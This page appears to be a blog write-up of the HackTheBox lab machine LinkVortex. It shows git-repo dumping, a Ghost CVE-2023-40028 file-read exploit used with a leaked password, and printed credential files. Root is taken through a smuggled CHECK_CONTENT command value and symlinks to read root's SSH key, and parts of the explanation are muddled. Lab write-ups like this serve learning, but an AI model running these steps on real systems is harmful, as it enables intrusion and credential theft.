@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<link rel="stylesheet" href="/_assets/main.css" />
+
+    <title>Linux - Easy - LinkVortex - abno&#39;s blog</title>
+  <link rel="stylesheet" href="/_markdown_plugin_assets/highlight.js/atom-one-light.css" /></head>
+  <body>
+    <div class="main">
+      <nav class="navigation">
+        <a href="/">abno&#39;s blog</a>
+      </nav>
+      <article>
+        <header>
+          <h1 class="article-title">Linux - Easy - LinkVortex</h1>
+          <div class="article-info">
+            <div>
+              <span
+                >Created At：<time datetime="1734377673343"
+                  >2024-12-16 20:34</time
+                ></span
+              >
+              <span
+                >Updated At：<time datetime="1748423126018"
+                  >2025-05-28 11:05</time
+                ></span
+              >
+            </div>
+            
+          </div>
+        </header>
+        <div class="article-content markdown-body"><h1 id="recon">Recon</h1>
+<p><img src="/_resources/f5399dbb73644b0aa62f0a5b119521fd.png" /></p>
+<div><pre class="hljs"><code>$whatweb http://linkvortex.htb/
+http://linkvortex.htb/ <span class="hljs-comment">[200 OK]</span> Apache, Country<span class="hljs-comment">[RESERVED]</span><span class="hljs-comment">[ZZ]</span>, HTML5, HTTPServer<span class="hljs-comment">[Apache]</span>, IP<span class="hljs-comment">[10.129.110.17]</span>, JQuery<span class="hljs-comment">[3.5.1]</span>, MetaGenerator<span class="hljs-comment">[Ghost 5.58]</span>, <span class="hljs-keyword">Open</span>-Graph-Protocol<span class="hljs-comment">[website]</span>, PoweredBy<span class="hljs-comment">[Ghost,a]</span>, Script<span class="hljs-comment">[application/ld+json]</span>, Title<span class="hljs-comment">[BitByBit Hardware]</span>, X-Powered-By<span class="hljs-comment">[Express]</span>, X-UA-Compatible<span class="hljs-comment">[IE=edge]</span></code></pre></div>
+<div><pre class="hljs"><code><span class="hljs-variable">$nmap</span> -p- -A <span class="hljs-number">10.129</span>.<span class="hljs-number">110.17</span>
+
+PORT   STATE SERVICE VERSION
+<span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">8.9</span>p1 Ubuntu <span class="hljs-number">3</span>ubuntu0.<span class="hljs-number">10</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)
+| ssh-<span class="hljs-symbol">hostkey:</span> 
+|   <span class="hljs-number">256</span> <span class="hljs-number">3</span><span class="hljs-symbol">e:</span><span class="hljs-symbol">f8:</span><span class="hljs-symbol">b9:</span><span class="hljs-number">68</span><span class="hljs-symbol">:c8</span><span class="hljs-symbol">:eb</span><span class="hljs-symbol">:</span><span class="hljs-number">57</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">f:</span><span class="hljs-symbol">cb:</span><span class="hljs-number">0</span><span class="hljs-symbol">b:</span><span class="hljs-number">47</span><span class="hljs-symbol">:b9</span><span class="hljs-symbol">:</span><span class="hljs-number">86</span><span class="hljs-symbol">:</span><span class="hljs-number">50</span><span class="hljs-symbol">:</span><span class="hljs-number">83</span><span class="hljs-symbol">:eb</span> (ECDSA)
+|_  <span class="hljs-number">256</span> <span class="hljs-symbol">a2:</span><span class="hljs-symbol">ea:</span><span class="hljs-number">6</span><span class="hljs-symbol">e:</span><span class="hljs-symbol">e1:</span><span class="hljs-symbol">b6:</span><span class="hljs-symbol">d7:</span><span class="hljs-symbol">e7:</span><span class="hljs-symbol">c5:</span><span class="hljs-number">86</span><span class="hljs-symbol">:</span><span class="hljs-number">69</span><span class="hljs-symbol">:ce</span><span class="hljs-symbol">:ba</span><span class="hljs-symbol">:</span><span class="hljs-number">05</span><span class="hljs-symbol">:</span><span class="hljs-number">9</span><span class="hljs-symbol">e:</span><span class="hljs-number">38</span><span class="hljs-symbol">:</span><span class="hljs-number">13</span> (ED25519)
+<span class="hljs-number">80</span>/tcp open  http    Apache httpd
+|_http-<span class="hljs-symbol">title:</span> Did <span class="hljs-keyword">not</span> follow redirect to <span class="hljs-symbol">http:</span>//linkvortex.htb/
+|_http-server-<span class="hljs-symbol">header:</span> Apache
+Service <span class="hljs-symbol">Info:</span> <span class="hljs-symbol">OS:</span> Linux; <span class="hljs-symbol">CPE:</span> <span class="hljs-symbol">cpe:</span>/<span class="hljs-symbol">o:</span><span class="hljs-symbol">linux:</span>linux_kernel</code></pre></div>
+<div><pre class="hljs"><code><span class="hljs-variable">$gobuster</span> vhost -w /usr/share/wordlists/seclists/Discovery/DNS/n0kovo_subdomains<span class="hljs-selector-class">.txt</span> -u http:<span class="hljs-comment">//linkvortex.htb  --append-domain -t 150</span>
+
+Found: dev<span class="hljs-selector-class">.linkvortex</span><span class="hljs-selector-class">.htb</span> Status: <span class="hljs-number">200</span> <span class="hljs-selector-attr">[Size: 2538]</span></code></pre></div>
+<p><img src="/_resources/5e365bc088804384b4b7d4935b73d35a.png" /></p>
+<p>Running dir on the dev site finds us git repo.</p>
+<p><img src="/_resources/70d29221bc4841639ee5ed3d2c1d80f1.png" /></p>
+<p>We can run <code>git-dumper http://dev.linkvortex.htb/ git</code> to copy all of it. To speedrun searching for creds we can run <code>grep -ri "password" .</code></p>
+<p>These two stand out the most:<br />
+./ghost/core/test/regression/api/admin/authentication.test.js:            const password = ‘OctopiFociPilfer45’;<br />
+./ghost/core/test/regression/api/admin/authentication.test.js:            const password = ‘thisissupersafe’;</p>
+<p>Looking then on github we can find some CVE’s for ghost. One of them is <a title="https://github.com/0xyassine/CVE-2023-40028" href="https://github.com/0xyassine/CVE-2023-40028">CVE-2023-40028</a>.</p>
+<p>We can execute after modifing the url to <code>http://linkvortex.htb</code> to get new shell.<br />
+<code>./CVE-2023-40028.sh -u admin@linkvortex.htb -p OctopiFociPilfer45</code></p>
+<p><img src="/_resources/604a50ed90874a5aa2f534e0bcb34daa.png" /></p>
+<div><pre class="hljs"><code><span class="hljs-symbol">root:</span><span class="hljs-symbol">x:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:root</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/bash</span>
+<span class="hljs-symbol">daemon:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">:daemon</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">bin:</span><span class="hljs-symbol">x:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">:bin</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">sys:</span><span class="hljs-symbol">x:</span><span class="hljs-number">3</span><span class="hljs-symbol">:</span><span class="hljs-number">3</span><span class="hljs-symbol">:sys</span><span class="hljs-symbol">:/dev</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">sync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">4</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:sync</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/bin/sync</span>
+<span class="hljs-symbol">games:</span><span class="hljs-symbol">x:</span><span class="hljs-number">5</span><span class="hljs-symbol">:</span><span class="hljs-number">60</span><span class="hljs-symbol">:games</span><span class="hljs-symbol">:/usr/games</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">man:</span><span class="hljs-symbol">x:</span><span class="hljs-number">6</span><span class="hljs-symbol">:</span><span class="hljs-number">12</span><span class="hljs-symbol">:man</span><span class="hljs-symbol">:/var/cache/man</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">lp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">7</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span><span class="hljs-symbol">:lp</span><span class="hljs-symbol">:/var/spool/lpd</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">mail:</span><span class="hljs-symbol">x:</span><span class="hljs-number">8</span><span class="hljs-symbol">:</span><span class="hljs-number">8</span><span class="hljs-symbol">:mail</span><span class="hljs-symbol">:/var/mail</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">news:</span><span class="hljs-symbol">x:</span><span class="hljs-number">9</span><span class="hljs-symbol">:</span><span class="hljs-number">9</span><span class="hljs-symbol">:news</span><span class="hljs-symbol">:/var/spool/news</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">uucp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">10</span><span class="hljs-symbol">:uucp</span><span class="hljs-symbol">:/var/spool/uucp</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">proxy:</span><span class="hljs-symbol">x:</span><span class="hljs-number">13</span><span class="hljs-symbol">:</span><span class="hljs-number">13</span><span class="hljs-symbol">:proxy</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+www-<span class="hljs-symbol">data:</span><span class="hljs-symbol">x:</span><span class="hljs-number">33</span><span class="hljs-symbol">:</span><span class="hljs-number">33</span><span class="hljs-symbol">:www-data</span><span class="hljs-symbol">:/var/www</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">backup:</span><span class="hljs-symbol">x:</span><span class="hljs-number">34</span><span class="hljs-symbol">:</span><span class="hljs-number">34</span><span class="hljs-symbol">:backup</span><span class="hljs-symbol">:/var/backups</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">list:</span><span class="hljs-symbol">x:</span><span class="hljs-number">38</span><span class="hljs-symbol">:</span><span class="hljs-number">38</span><span class="hljs-symbol">:Mailing</span> List <span class="hljs-symbol">Manager:</span>/var/<span class="hljs-symbol">list:</span>/usr/sbin/nologin
+<span class="hljs-symbol">irc:</span><span class="hljs-symbol">x:</span><span class="hljs-number">39</span><span class="hljs-symbol">:</span><span class="hljs-number">39</span><span class="hljs-symbol">:ircd</span><span class="hljs-symbol">:/run/ircd</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">gnats:</span><span class="hljs-symbol">x:</span><span class="hljs-number">41</span><span class="hljs-symbol">:</span><span class="hljs-number">41</span><span class="hljs-symbol">:Gnats</span> Bug-Reporting System (admin)<span class="hljs-symbol">:/var/lib/gnats</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">nobody:</span><span class="hljs-symbol">x:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:nobody</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">_apt:</span><span class="hljs-symbol">x:</span><span class="hljs-number">100</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">node:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/home/node</span><span class="hljs-symbol">:/bin/bash</span>
+file&gt; <span class="hljs-regexp">/var/lib</span><span class="hljs-regexp">/ghost/config</span>.production.json</code></pre></div>
+<p><a title="https://forum.ghost.org/t/how-access-config-production-json/45440" href="https://forum.ghost.org/t/how-access-config-production-json/45440">Looking on ghost forum</a> I’ve found that there exists a file called config.production.json in ghost. We can grab it using our new shell.</p>
+<div><pre class="hljs"><code><span class="hljs-keyword">file</span>&gt; <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/ghost/</span>config.production.json
+{
+  <span class="hljs-string">"url"</span>: <span class="hljs-string">"http://localhost:2368"</span>,
+  <span class="hljs-string">"server"</span>: {
+    <span class="hljs-string">"port"</span>: <span class="hljs-number">2368</span>,
+    <span class="hljs-string">"host"</span>: <span class="hljs-string">"::"</span>
+  },
+  <span class="hljs-string">"mail"</span>: {
+    <span class="hljs-string">"transport"</span>: <span class="hljs-string">"Direct"</span>
+  },
+  <span class="hljs-string">"logging"</span>: {
+    <span class="hljs-string">"transports"</span>: [<span class="hljs-string">"stdout"</span>]
+  },
+  <span class="hljs-string">"process"</span>: <span class="hljs-string">"systemd"</span>,
+  <span class="hljs-string">"paths"</span>: {
+    <span class="hljs-string">"contentPath"</span>: <span class="hljs-string">"/var/lib/ghost/content"</span>
+  },
+  <span class="hljs-string">"spam"</span>: {
+    <span class="hljs-string">"user_login"</span>: {
+        <span class="hljs-string">"minWait"</span>: <span class="hljs-number">1</span>,
+        <span class="hljs-string">"maxWait"</span>: <span class="hljs-number">604800000</span>,
+        <span class="hljs-string">"freeRetries"</span>: <span class="hljs-number">5000</span>
+    }
+  },
+  <span class="hljs-string">"mail"</span>: {
+     <span class="hljs-string">"transport"</span>: <span class="hljs-string">"SMTP"</span>,
+     <span class="hljs-string">"options"</span>: {
+      <span class="hljs-string">"service"</span>: <span class="hljs-string">"Google"</span>,
+      <span class="hljs-string">"host"</span>: <span class="hljs-string">"linkvortex.htb"</span>,
+      <span class="hljs-string">"port"</span>: <span class="hljs-number">587</span>,
+      <span class="hljs-string">"auth"</span>: {
+        <span class="hljs-string">"user"</span>: <span class="hljs-string">"bob@linkvortex.htb"</span>,
+        <span class="hljs-string">"pass"</span>: <span class="hljs-string">"fibber-talented-worth"</span>
+        }
+      }
+    }
+}</code></pre></div>
+<p>We can now ssh as bob.</p>
+<h1 id="priv-esc">Priv esc</h1>
+<p>Doing a basic check gives us an obvious hint.</p>
+<div><pre class="hljs"><code>bob<span class="hljs-variable">@linkvortex</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>sudo -l
+Matching Defaults entries <span class="hljs-keyword">for</span> bob on <span class="hljs-symbol">linkvortex:</span>
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="hljs-symbol">:/usr/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span>\<span class="hljs-symbol">:/snap/bin</span>, use_pty, env_keep+=CHECK_CONTENT
+
+User bob may run the following commands on <span class="hljs-symbol">linkvortex:</span>
+    (ALL) <span class="hljs-symbol">NOPASSWD:</span> /usr/bin/bash /opt/ghost/clean_symlink.sh *.png</code></pre></div>
+<div><pre class="hljs"><code>bob@linkvortex:~$ cat <span class="hljs-regexp">/opt/g</span>host/clean_symlink.sh
+<span class="hljs-comment">#!/bin/bash</span>
+
+QUAR_DIR=<span class="hljs-string">"/var/quarantined"</span>
+
+<span class="hljs-keyword">if</span> [ -z <span class="hljs-variable">$CHECK_CONTENT</span> ];then
+  CHECK_CONTENT=false
+fi
+
+LINK=<span class="hljs-variable">$1</span>
+
+<span class="hljs-keyword">if</span> ! [[ <span class="hljs-string">"$LINK"</span> =~ \.png$ ]]; then
+  <span class="hljs-regexp">/usr/</span>bin/echo <span class="hljs-string">"! First argument must be a png file !"</span>
+  <span class="hljs-keyword">exit</span> <span class="hljs-number">2</span>
+fi
+
+<span class="hljs-keyword">if</span> <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/sudo /u</span>sr<span class="hljs-regexp">/bin/</span>test -L <span class="hljs-variable">$LINK</span>;then
+  LINK_NAME=$(<span class="hljs-regexp">/usr/</span>bin/basename <span class="hljs-variable">$LINK</span>)
+  LINK_TARGET=$(<span class="hljs-regexp">/usr/</span>bin/readlink <span class="hljs-variable">$LINK</span>)
+  <span class="hljs-keyword">if</span> <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/echo "$LINK_TARGET" | /u</span>sr<span class="hljs-regexp">/bin/g</span>rep -Eq <span class="hljs-string">'(etc|root)'</span>;then
+    <span class="hljs-regexp">/usr/</span>bin/echo <span class="hljs-string">"! Trying to read critical files, removing link [ $LINK ] !"</span>
+    <span class="hljs-regexp">/usr/</span>bin/unlink <span class="hljs-variable">$LINK</span>
+  <span class="hljs-keyword">else</span>
+    <span class="hljs-regexp">/usr/</span>bin/echo <span class="hljs-string">"Link found [ $LINK ] , moving it to quarantine"</span>
+    <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/mv $LINK $QUAR_DIR/</span>
+    <span class="hljs-keyword">if</span> <span class="hljs-variable">$CHECK_CONTENT</span>;then
+      <span class="hljs-regexp">/usr/</span>bin/echo <span class="hljs-string">"Content:"</span>
+      <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/cat $QUAR_DIR/</span><span class="hljs-variable">$LINK_NAME</span> <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span>null
+    fi
+  fi
+fi</code></pre></div>
+<p>The -z flag will print out the contents of the file, after moving. The thing is, we cannot set -z flag manualy, as we are not permited to run it as sudo then. What we can do then is set enviroment variable that will give the name of the file. When the script is being run, it will take it from our enviroment and not from the flag contents (if its not provided).</p>
+<p>So my first attempt was:</p>
+<div><pre class="hljs"><code>export CHECK_CONTENT=<span class="hljs-string">'/root/.ssh/id_rsa'</span>
+ln -s <span class="hljs-regexp">/root/</span>.ssh/id_rsa pwn.png
+sudo <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/bash /</span>opt<span class="hljs-regexp">/ghost/</span>clean_symlink.sh pwn.png</code></pre></div>
+<p>Second attempt with abusing /bin/cat, so we print BEFORE doing anything with the file.</p>
+<div><pre class="hljs"><code>export CHECK_CONTENT=<span class="hljs-string">'/bin/cat /root/.ssh/id_rsa'</span>
+ln -s <span class="hljs-regexp">/root/</span>.ssh/id_rsa pwn.png
+sudo <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/bash /</span>opt<span class="hljs-regexp">/ghost/</span>clean_symlink.sh proxy.png</code></pre></div>
+<p>Third attempt, trying to bypass the quarantine by making a symlink to a symlink.</p>
+<div><pre class="hljs"><code>export CHECK_CONTENT=<span class="hljs-string">'/bin/cat /root/.ssh/id_rsa'</span>
+ln -s <span class="hljs-regexp">/root/</span>.ssh/id_rsa pwn.png
+ln -s pwn.png proxy.png 
+sudo <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/bash /</span>opt<span class="hljs-regexp">/ghost/</span>clean_symlink.sh proxy.png</code></pre></div>
+<p>We get root id_rsa, now only ssh in, get the flag and we are done.</p>
+</div>
+      </article>
+    </div>
+  </body>
+</html>
